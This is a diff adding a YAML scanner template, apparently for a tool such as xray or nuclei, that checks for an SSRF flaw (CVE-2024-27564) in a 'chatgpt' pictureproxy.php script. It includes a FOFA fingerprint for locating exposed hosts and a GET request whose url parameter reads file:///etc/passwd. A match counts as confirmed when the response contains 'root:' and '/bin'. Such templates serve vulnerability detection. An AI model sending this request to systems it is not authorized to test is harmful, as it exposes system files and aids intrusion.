@@ -1,0 +1,17 @@
+id: poc-yaml-chatgpt-pictureproxy-php-ssrf
+info:
+  name: chatgpt pictureproxy.php SSRF漏洞(CVE-2024-27564)
+  severity: high
+  tags:
+  - 两高一弱
+  - ssrf
+  - CVE-2024-27564
+  finger: chatgpt
+  fofa: icon_hash="-1999760920"
+requests:
+- method: GET
+  path: /pictureproxy.php?url=file:///etc/passwd
+  expression: status_code == 200 && contains(headers,"image/jpeg") && contains(body,"root:")
+    && contains(body,"/bin")
+variables: {}
+transport: http
